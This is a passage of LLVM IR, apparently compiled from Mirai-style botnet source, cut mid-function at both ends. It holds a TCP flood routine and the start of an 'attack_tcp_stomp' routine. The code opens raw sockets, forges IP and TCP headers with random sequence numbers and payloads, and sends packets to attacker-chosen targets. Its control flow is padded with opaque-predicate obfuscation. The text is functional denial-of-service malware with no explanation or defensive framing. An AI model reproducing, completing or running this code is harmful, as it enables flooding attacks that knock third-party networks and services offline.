  %490 = call i32 @rand_next()
  %491 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %492 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %491, i32 0, i32 3
  store i32 %490, i32* %492, align 4
  br label %493

; <label>:493:                                    ; preds = %489, %486
  %494 = load i8, i8* %27, align 1
  %495 = icmp ne i8 %494, 0
  br i1 %495, label %496, label %499

; <label>:496:                                    ; preds = %493
  %497 = load i8*, i8** %35, align 8
  %498 = load i32, i32* %26, align 4
  call void @rand_str(i8* %497, i32 %498)
  br label %499

; <label>:499:                                    ; preds = %496, %493
  %500 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %501 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %500, i32 0, i32 7
  store i16 0, i16* %501, align 2
  %502 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %503 = bitcast %struct.iphdr* %502 to i16*
  %504 = call zeroext i16 @checksum_generic(i16* %503, i32 20)
  %505 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %506 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %505, i32 0, i32 7
  store i16 %504, i16* %506, align 2
  %507 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %508 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %507, i32 0, i32 6
  store i16 0, i16* %508, align 4
  %509 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %510 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %511 = bitcast %struct.tcphdr* %510 to i8*
  %512 = load i32, i32* %26, align 4
  %513 = sext i32 %512 to i64
  %514 = add i64 20, %513
  %515 = trunc i64 %514 to i16
  %516 = call zeroext i16 @htons(i16 zeroext %515) #7
  %517 = load i32, i32* %26, align 4
  %518 = sext i32 %517 to i64
  %519 = add i64 20, %518
  %520 = trunc i64 %519 to i32
  %521 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %509, i8* %511, i16 zeroext %516, i32 %520)
  %522 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %523 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %522, i32 0, i32 6
  store i16 %521, i16* %523, align 4
  %524 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %525 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %524, i32 0, i32 1
  %526 = load i16, i16* %525, align 2
  %527 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %528 = load i32, i32* %9, align 4
  %529 = sext i32 %528 to i64
  %530 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %527, i64 %529
  %531 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %530, i32 0, i32 0
  %532 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %531, i32 0, i32 1
  store i16 %526, i16* %532, align 2
  %533 = load i32, i32* %10, align 4
  %534 = load i8*, i8** %32, align 8
  %535 = load i32, i32* %26, align 4
  %536 = sext i32 %535 to i64
  %537 = add i64 40, %536
  %538 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %539 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %540 = load i32, i32* %9, align 4
  %541 = sext i32 %540 to i64
  %542 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %539, i64 %541
  %543 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %542, i32 0, i32 0
  %544 = bitcast %struct.sockaddr_in* %543 to %struct.sockaddr*
  store %struct.sockaddr* %544, %struct.sockaddr** %538, align 8
  %545 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %546 = load %struct.sockaddr*, %struct.sockaddr** %545, align 8
  %547 = call i64 @sendto(i32 %533, i8* %534, i64 %537, i32 16384, %struct.sockaddr* %546, i32 16)
  br label %548

; <label>:548:                                    ; preds = %499
  %549 = load i32, i32* @x.27
  %550 = load i32, i32* @y.28
  %551 = sub i32 %549, 1
  %552 = mul i32 %549, %551
  %553 = urem i32 %552, 2
  %554 = icmp eq i32 %553, 0
  %555 = icmp slt i32 %550, 10
  %556 = or i1 %554, %555
  br i1 %556, label %originalBB28, label %originalBB28alteredBB

originalBB28:                                     ; preds = %originalBB28alteredBB, %548
  %557 = load i32, i32* %9, align 4
  %558 = add nsw i32 %557, 1
  store i32 %558, i32* %9, align 4
  %559 = load i32, i32* @x.27
  %560 = load i32, i32* @y.28
  %561 = sub i32 %559, 1
  %562 = mul i32 %559, %561
  %563 = urem i32 %562, 2
  %564 = icmp eq i32 %563, 0
  %565 = icmp slt i32 %560, 10
  %566 = or i1 %564, %565
  br i1 %566, label %originalBBpart232, label %originalBB28alteredBB

originalBBpart232:                                ; preds = %originalBB28
  br label %330

; <label>:567:                                    ; preds = %330
  %568 = load i32, i32* @x.27
  %569 = load i32, i32* @y.28
  %570 = sub i32 %568, 1
  %571 = mul i32 %568, %570
  %572 = urem i32 %571, 2
  %573 = icmp eq i32 %572, 0
  %574 = icmp slt i32 %569, 10
  %575 = or i1 %573, %574
  br i1 %575, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %567
  %576 = load i32, i32* @x.27
  %577 = load i32, i32* @y.28
  %578 = sub i32 %576, 1
  %579 = mul i32 %576, %578
  %580 = urem i32 %579, 2
  %581 = icmp eq i32 %580, 0
  %582 = icmp slt i32 %577, 10
  %583 = or i1 %581, %582
  br i1 %583, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %313

; <label>:584:                                    ; preds = %originalBBpart2, %108
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %114
  %585 = load i32, i32* %10, align 4
  %586 = call i32 @close(i32 %585)
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %284
  %587 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %588 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %587, i32 0, i32 4
  %589 = load i16, i16* %588, align 4
  %_ = sub i16 0, %589
  %gen = add i16 %_, -2049
  %590 = and i16 %589, -2049
  %_2 = shl i16 %590, 2048
  %_3 = sub i16 %590, 2048
  %gen4 = mul i16 %_3, 2048
  %591 = or i16 %590, 2048
  store i16 %591, i16* %588, align 4
  br label %originalBB1

originalBB8alteredBB:                             ; preds = %originalBB8, %313
  store i32 0, i32* %9, align 4
  br label %originalBB8

originalBB12alteredBB:                            ; preds = %originalBB12, %335
  %592 = load i8**, i8*** %11, align 8
  %593 = load i32, i32* %9, align 4
  %594 = sext i32 %593 to i64
  %595 = getelementptr inbounds i8*, i8** %592, i64 %594
  %596 = load i8*, i8** %595, align 8
  store i8* %596, i8** %32, align 8
  %597 = load i8*, i8** %32, align 8
  %598 = bitcast i8* %597 to %struct.iphdr*
  store %struct.iphdr* %598, %struct.iphdr** %33, align 8
  %599 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %600 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %599, i64 1
  %601 = bitcast %struct.iphdr* %600 to %struct.tcphdr*
  store %struct.tcphdr* %601, %struct.tcphdr** %34, align 8
  %602 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %603 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %602, i64 1
  %604 = bitcast %struct.tcphdr* %603 to i8*
  store i8* %604, i8** %35, align 8
  %605 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %606 = load i32, i32* %9, align 4
  %607 = sext i32 %606 to i64
  %608 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %605, i64 %607
  %609 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %608, i32 0, i32 2
  %610 = load i8, i8* %609, align 4
  %611 = zext i8 %610 to i32
  %612 = icmp slt i32 %611, 32
  br label %originalBB12

originalBB16alteredBB:                            ; preds = %originalBB16, %397
  %613 = call i32 @rand_next()
  %614 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %615 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %614, i32 0, i32 8
  store i32 %613, i32* %615, align 4
  br label %originalBB16

originalBB20alteredBB:                            ; preds = %originalBB20, %417
  %616 = load i16, i16* %13, align 2
  %617 = zext i16 %616 to i32
  %618 = icmp eq i32 %617, 65535
  br label %originalBB20

originalBB24alteredBB:                            ; preds = %originalBB24, %466
  %619 = call i32 @rand_next()
  %620 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %621 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %620, i32 0, i32 2
  store i32 %619, i32* %621, align 4
  br label %originalBB24

originalBB28alteredBB:                            ; preds = %originalBB28, %548
  %622 = load i32, i32* %9, align 4
  %_29 = sub i32 %622, 1
  %gen30 = mul i32 %_29, 1
  %623 = add nsw i32 %622, 1
  store i32 %623, i32* %9, align 4
  br label %originalBB28

originalBB34alteredBB:                            ; preds = %originalBB34, %567
  br label %originalBB34
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_stomp(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.attack_stomp_data*, align 8
  %12 = alloca i8**, align 8
  %13 = alloca i8, align 1
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i8, align 1
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.sockaddr_in, align 4
  %28 = alloca %struct.sockaddr_in, align 4
  %29 = alloca i32, align 4
  %30 = alloca [256 x i8], align 16
  %31 = alloca i64, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %33 = alloca i32, align 4
  %34 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %struct.iphdr*, align 8
  %41 = alloca %struct.tcphdr*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %44 = load i8, i8* %5, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 16) #6
  %47 = bitcast i8* %46 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %47, %struct.attack_stomp_data** %11, align 8
  %48 = load i8, i8* %5, align 1
  %49 = zext i8 %48 to i64
  %50 = call noalias i8* @calloc(i64 %49, i64 8) #6
  %51 = bitcast i8* %50 to i8**
  store i8** %51, i8*** %12, align 8
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 2, i32 0)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %13, align 1
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 3, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %14, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 4, i32 64)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %15, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 5, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %16, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %17, align 2
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 11, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %18, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 12, i32 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %19, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 13, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %20, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 14, i32 0)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %21, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 15, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %22, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = call i32 @attack_get_opt_int(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 16, i32 0)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %23, align 1
  %96 = load i8, i8* %7, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %98 = call i32 @attack_get_opt_int(i8 zeroext %96, %struct.attack_option* %97, i8 zeroext 0, i32 768)
  store i32 %98, i32* %24, align 4
  %99 = load i8, i8* %7, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 1, i32 1)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %25, align 1
  %103 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %103, i32* %10, align 4
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %106

; <label>:105:                                    ; preds = %4
  br label %959

; <label>:106:                                    ; preds = %4
  %107 = load i32, i32* @x.29
  %108 = load i32, i32* @y.30
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %106
  store i32 1, i32* %9, align 4
  %115 = load i32, i32* %10, align 4
  %116 = bitcast i32* %9 to i8*
  %117 = call i32 @setsockopt(i32 %115, i32 0, i32 3, i8* %116, i32 4) #6
  %118 = icmp eq i32 %117, -1
  %119 = load i32, i32* @x.29
  %120 = load i32, i32* @y.30
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %118, label %127, label %130

; <label>:127:                                    ; preds = %originalBBpart2
  %128 = load i32, i32* %10, align 4
  %129 = call i32 @close(i32 %128)
  br label %959

; <label>:130:                                    ; preds = %originalBBpart2
  %131 = load i32, i32* @x.29
  %132 = load i32, i32* @y.30
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %130
  store i32 0, i32* %9, align 4
  %139 = load i32, i32* @x.29
  %140 = load i32, i32* @y.30
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %147

; <label>:147:                                    ; preds = %originalBBpart2329, %originalBBpart24
  %148 = load i32, i32* %9, align 4
  %149 = load i8, i8* %5, align 1
  %150 = zext i8 %149 to i32
  %151 = icmp slt i32 %148, %150
  br i1 %151, label %152, label %751

; <label>:152:                                    ; preds = %147
  br label %153

; <label>:153:                                    ; preds = %originalBBpart2315, %originalBBpart2293, %152
  %154 = load i32, i32* @x.29
  %155 = load i32, i32* @y.30
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %153
  %162 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %162, i32* %26, align 4
  %163 = icmp eq i32 %162, -1
  %164 = load i32, i32* @x.29
  %165 = load i32, i32* @y.30
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %163, label %172, label %173

; <label>:172:                                    ; preds = %originalBBpart28
  br label %732

; <label>:173:                                    ; preds = %originalBBpart28
  %174 = load i32, i32* %26, align 4
  %175 = load i32, i32* %26, align 4
  %176 = call i32 (i32, i32, ...) @fcntl(i32 %175, i32 3, i32 0)
  %177 = or i32 %176, 2048
  %178 = call i32 (i32, i32, ...) @fcntl(i32 %174, i32 4, i32 %177)
  %179 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i16 2, i16* %179, align 4
  %180 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %181 = load i32, i32* %9, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %180, i64 %182
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %183, i32 0, i32 2
  %185 = load i8, i8* %184, align 4
  %186 = zext i8 %185 to i32
  %187 = icmp slt i32 %186, 32
  br i1 %187, label %188, label %225

; <label>:188:                                    ; preds = %173
  %189 = load i32, i32* @x.29
  %190 = load i32, i32* @y.30
  %191 = sub i32 %189, 1
  %192 = mul i32 %189, %191
  %193 = urem i32 %192, 2
  %194 = icmp eq i32 %193, 0
  %195 = icmp slt i32 %190, 10
  %196 = or i1 %194, %195
  br i1 %196, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %188
  %197 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %198 = load i32, i32* %9, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %197, i64 %199
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %200, i32 0, i32 1
  %202 = load i32, i32* %201, align 4
  %203 = call i32 @ntohl(i32 %202) #7
  %204 = call i32 @rand_next()
  %205 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %206 = load i32, i32* %9, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %205, i64 %207
  %209 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %208, i32 0, i32 2
  %210 = load i8, i8* %209, align 4
  %211 = zext i8 %210 to i32
  %212 = lshr i32 %204, %211
  %213 = add i32 %203, %212
  %214 = call i32 @htonl(i32 %213) #7
  %215 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %216 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %215, i32 0, i32 0
  store i32 %214, i32* %216, align 4
  %217 = load i32, i32* @x.29
  %218 = load i32, i32* @y.30
  %219 = sub i32 %217, 1
  %220 = mul i32 %217, %219
  %221 = urem i32 %220, 2
  %222 = icmp eq i32 %221, 0
  %223 = icmp slt i32 %218, 10
  %224 = or i1 %222, %223
  br i1 %224, label %originalBBpart227, label %originalBB10alteredBB

originalBBpart227:                                ; preds = %originalBB10
  br label %250

; <label>:225:                                    ; preds = %173
  %226 = load i32, i32* @x.29
  %227 = load i32, i32* @y.30
  %228 = sub i32 %226, 1
  %229 = mul i32 %226, %228
  %230 = urem i32 %229, 2
  %231 = icmp eq i32 %230, 0
  %232 = icmp slt i32 %227, 10
  %233 = or i1 %231, %232
  br i1 %233, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %225
  %234 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %235 = load i32, i32* %9, align 4
  %236 = sext i32 %235 to i64
  %237 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %234, i64 %236
  %238 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %237, i32 0, i32 1
  %239 = load i32, i32* %238, align 4
  %240 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %241 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %240, i32 0, i32 0
  store i32 %239, i32* %241, align 4
  %242 = load i32, i32* @x.29
  %243 = load i32, i32* @y.30
  %244 = sub i32 %242, 1
  %245 = mul i32 %242, %244
  %246 = urem i32 %245, 2
  %247 = icmp eq i32 %246, 0
  %248 = icmp slt i32 %243, 10
  %249 = or i1 %247, %248
  br i1 %249, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br label %250

; <label>:250:                                    ; preds = %originalBBpart231, %originalBBpart227
  %251 = load i32, i32* @x.29
  %252 = load i32, i32* @y.30
  %253 = sub i32 %251, 1
  %254 = mul i32 %251, %253
  %255 = urem i32 %254, 2
  %256 = icmp eq i32 %255, 0
  %257 = icmp slt i32 %252, 10
  %258 = or i1 %256, %257
  br i1 %258, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %250
  %259 = load i16, i16* %17, align 2
  %260 = zext i16 %259 to i32
  %261 = icmp eq i32 %260, 65535
  %262 = load i32, i32* @x.29
  %263 = load i32, i32* @y.30
  %264 = sub i32 %262, 1
  %265 = mul i32 %262, %264
  %266 = urem i32 %265, 2
  %267 = icmp eq i32 %266, 0
  %268 = icmp slt i32 %263, 10
  %269 = or i1 %267, %268
  br i1 %269, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br i1 %261, label %270, label %275

; <label>:270:                                    ; preds = %originalBBpart235
  %271 = call i32 @rand_next()
  %272 = and i32 %271, 65535
  %273 = trunc i32 %272 to i16
  %274 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %273, i16* %274, align 2
  br label %279

; <label>:275:                                    ; preds = %originalBBpart235
  %276 = load i16, i16* %17, align 2
  %277 = call zeroext i16 @htons(i16 zeroext %276) #7
  %278 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %277, i16* %278, align 2
  br label %279

; <label>:279:                                    ; preds = %275, %270
  %280 = load i32, i32* @x.29
  %281 = load i32, i32* @y.30
  %282 = sub i32 %280, 1
  %283 = mul i32 %280, %282
  %284 = urem i32 %283, 2
  %285 = icmp eq i32 %284, 0
  %286 = icmp slt i32 %281, 10
  %287 = or i1 %285, %286
  br i1 %287, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %279
  %288 = load i32, i32* %26, align 4
  %289 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %290 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  store %struct.sockaddr* %290, %struct.sockaddr** %289, align 8
  %291 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %292 = load %struct.sockaddr*, %struct.sockaddr** %291, align 8
  %293 = call i32 @connect(i32 %288, %struct.sockaddr* %292, i32 16)
  %294 = call i64 @time(i64* null) #6
  store i64 %294, i64* %31, align 8
  %295 = load i32, i32* @x.29
  %296 = load i32, i32* @y.30
  %297 = sub i32 %295, 1
  %298 = mul i32 %295, %297
  %299 = urem i32 %298, 2
  %300 = icmp eq i32 %299, 0
  %301 = icmp slt i32 %296, 10
  %302 = or i1 %300, %301
  br i1 %302, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br label %303

; <label>:303:                                    ; preds = %730, %originalBBpart239
  store i32 16, i32* %29, align 4
  %304 = load i32, i32* %10, align 4
  %305 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %306 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %307 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %307, %struct.sockaddr** %306, align 8
  %308 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %309 = load %struct.sockaddr*, %struct.sockaddr** %308, align 8
  %310 = call i64 @recvfrom(i32 %304, i8* %305, i64 256, i32 16384, %struct.sockaddr* %309, i32* %29)
  %311 = trunc i64 %310 to i32
  store i32 %311, i32* %33, align 4
  %312 = load i32, i32* %33, align 4
  %313 = icmp eq i32 %312, -1
  br i1 %313, label %314, label %331

; <label>:314:                                    ; preds = %303
  %315 = load i32, i32* @x.29
  %316 = load i32, i32* @y.30
  %317 = sub i32 %315, 1
  %318 = mul i32 %315, %317
  %319 = urem i32 %318, 2
  %320 = icmp eq i32 %319, 0
  %321 = icmp slt i32 %316, 10
  %322 = or i1 %320, %321
  br i1 %322, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %314
  %323 = load i32, i32* @x.29
  %324 = load i32, i32* @y.30
  %325 = sub i32 %323, 1
  %326 = mul i32 %323, %325
  %327 = urem i32 %326, 2
  %328 = icmp eq i32 %327, 0
  %329 = icmp slt i32 %324, 10
  %330 = or i1 %328, %329
  br i1 %330, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br label %959

; <label>:331:                                    ; preds = %303
  %332 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %333 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %332, i32 0, i32 0
  %334 = load i32, i32* %333, align 4
  %335 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %336 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %335, i32 0, i32 0
  %337 = load i32, i32* %336, align 4
  %338 = icmp eq i32 %334, %337
  br i1 %338, label %339, label %690

; <label>:339:                                    ; preds = %331
  %340 = load i32, i32* %33, align 4
  %341 = sext i32 %340 to i64
  %342 = icmp ugt i64 %341, 40
  br i1 %342, label %343, label %690

; <label>:343:                                    ; preds = %339
  %344 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %345 = getelementptr inbounds i8, i8* %344, i64 20
  %346 = bitcast i8* %345 to %struct.tcphdr*
  store %struct.tcphdr* %346, %struct.tcphdr** %35, align 8
  %347 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %348 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %347, i32 0, i32 0
  %349 = load i16, i16* %348, align 4
  %350 = zext i16 %349 to i32
  %351 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %352 = load i16, i16* %351, align 2
  %353 = zext i16 %352 to i32
  %354 = icmp eq i32 %350, %353
  br i1 %354, label %355, label %689

; <label>:355:                                    ; preds = %343
  %356 = load i32, i32* @x.29
  %357 = load i32, i32* @y.30
  %358 = sub i32 %356, 1
  %359 = mul i32 %356, %358
  %360 = urem i32 %359, 2
  %361 = icmp eq i32 %360, 0
  %362 = icmp slt i32 %357, 10
  %363 = or i1 %361, %362
  br i1 %363, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %355
  %364 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %365 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %364, i32 0, i32 4
  %366 = load i16, i16* %365, align 4
  %367 = lshr i16 %366, 9
  %368 = and i16 %367, 1
  %369 = zext i16 %368 to i32
  %370 = icmp ne i32 %369, 0
  %371 = load i32, i32* @x.29
